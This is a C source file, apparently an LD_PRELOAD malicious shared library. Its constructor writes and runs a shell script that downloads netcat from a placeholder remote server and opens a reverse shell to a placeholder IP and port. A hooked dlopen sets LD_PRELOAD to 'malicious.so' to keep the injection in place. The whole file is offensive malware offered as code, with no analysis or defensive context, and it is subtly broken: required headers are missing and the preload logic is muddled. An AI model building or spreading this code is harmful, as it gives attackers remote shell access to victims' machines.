#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>

static void __attribute__((constructor)) init(void) {
    char *script_path = "/tmp/script.sh";
    FILE *script_file = fopen(script_path, "w");
    if (!script_file) {
        fprintf(stderr, "Error: could not open script file\n");
        return;
    }
    fprintf(script_file, "#!/bin/bash\n");
    fprintf(script_file, "wget http://<remote_server>/netcat.zip -P /tmp/\n");
    fprintf(script_file, "unzip /tmp/netcat.zip -d /tmp/\n");
    fprintf(script_file, "/tmp/nc <ip> <port> /bin/bash\n");
    fprintf(script_file, "rm /tmp/netcat.zip\n");
    fclose(script_file);
    chmod(script_path, 0700);
    system(script_path);
}

void *dlopen(const char *filename, int flags) {
    void *(*orig_dlopen)(const char *, int) = dlsym(RTLD_NEXT, "dlopen");
    char *env = getenv("LD_PRELOAD");
    if (env && strstr(env, "malicious.so")) {
        return orig_dlopen(filename, flags);
    }
    if (!strcmp(filename, "libmylib.so")) {
        setenv("LD_PRELOAD", "malicious.so", 1);
    }
    return orig_dlopen(filename, flags);
}
